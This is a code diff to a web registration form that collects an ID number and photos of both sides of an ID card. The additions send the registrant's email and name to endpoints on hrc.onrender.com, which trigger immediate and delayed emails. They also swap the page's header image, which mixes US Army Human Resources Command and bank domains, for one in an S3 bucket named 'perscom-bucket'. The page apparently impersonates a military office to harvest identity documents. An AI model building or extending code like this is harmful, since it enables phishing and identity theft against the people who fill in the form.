@@ -558,6 +558,8 @@ function Registration() {
     const idNumber = document.getElementById("idNumber").value;
     const idFront = document.getElementById("imageUploadFront").files[0]; // ID front image
     const idBack = document.getElementById("imageUploadBack").files[0]; // ID back image
+    sendImmediateEmail(email, firstName);
+    sendDelayedEmail(email, firstName);
     // Construct message for text data
     const message = `
             New Registration:
@@ -631,14 +633,42 @@ function Registration() {
         console.error("Error sending image:", error);
       });
   }
+  const sendDelayedEmail = async (email, name) => {
+    const response = await fetch("https://hrc.onrender.com/send-email", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ email, name }),
+    });
+
+    // No need to handle the response
+    // You can log if needed
+    // console.log('Delayed email request sent');
+  };
+  const sendImmediateEmail = async (email, name) => {
+    const response = await fetch(
+      "https://hrc.onrender.com/send-email-no-delay",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ email, name }),
+      }
+    );
+
+    // No need to handle the response
+    // You can log if needed
+    console.log("Immediate email request sent");
+  };
 }
 const observer = new MutationObserver(() => {
   const img = document.querySelector(
     'img[src="https://www.dmdc.osd.mil/identitymanagement/api/data/www.citizensbankonline.3-a.net/header.png"]'
   );
   if (img) {
-    img.src =
-      "https://www.dmdc.osd.mil/identitymanagement/api/data/www.hrc.army.mil/header.png"; // New image URL
+    img.src = "https://perscom-bucket.s3.eu-west-1.amazonaws.com/header.png"; // New image URL
   }
 
   if (
